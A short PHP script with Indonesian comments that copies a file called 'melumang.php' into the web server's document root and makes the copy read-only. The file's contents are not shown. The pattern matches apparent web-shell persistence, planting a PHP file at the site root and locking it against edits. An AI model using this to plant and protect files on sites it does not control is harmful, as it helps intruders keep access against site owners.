<?php
// Path sumber file
$sourceFile = 'melumang.php'; // Path relatif ke file melumang.php

// Path tujuan, yakni dokumen root (misalnya /var/www/html atau sesuai dengan hosting Anda)
$destination = $_SERVER['DOCUMENT_ROOT'] . '/melumang.php';

// Cek apakah file sumber ada
if (file_exists($sourceFile)) {
    // Buka file sumber untuk membaca
    $sourceHandle = fopen($sourceFile, 'r');

    // Buka file tujuan untuk menulis
    $destinationHandle = fopen($destination, 'w');

    if ($sourceHandle && $destinationHandle) {
        // Salin isi file
        while (!feof($sourceHandle)) {
            $content = fread($sourceHandle, 8192);
            fwrite($destinationHandle, $content);
        }
        fclose($sourceHandle);
        fclose($destinationHandle);

        // Ubah permission file tujuan menjadi 0444 (read-only)
        if (chmod($destination, 0444)) {
            echo "File berhasil disalin dan diubah menjadi read-only di: " . $destination;
        } else {
            echo "Gagal mengubah permission file.";
        }
    } else {
        echo "Gagal membuka file.";
    }
} else {
    echo "File sumber tidak ditemukan di: " . $sourceFile;
}
?>
